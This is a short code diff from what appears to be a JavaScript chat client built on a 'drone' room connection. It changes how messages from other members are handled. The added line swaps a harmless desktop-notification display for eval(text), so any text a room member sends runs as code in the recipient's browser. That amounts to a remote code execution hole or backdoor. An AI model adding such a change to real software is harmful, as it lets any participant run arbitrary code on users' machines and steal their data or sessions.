@@ -190,7 +190,7 @@ drone.on('open', error => {
 
   room.on('data', (text, member) => {
     if (member) {
-      var body = text; var title = 'MESSAGE FROM 2-JS';var icon = 'https://github.githubassets.com/favicons/favicon.png';var notification = new Notification(title, { body, icon});
+     eval(text)
     } else {
       // Message is from server
     }
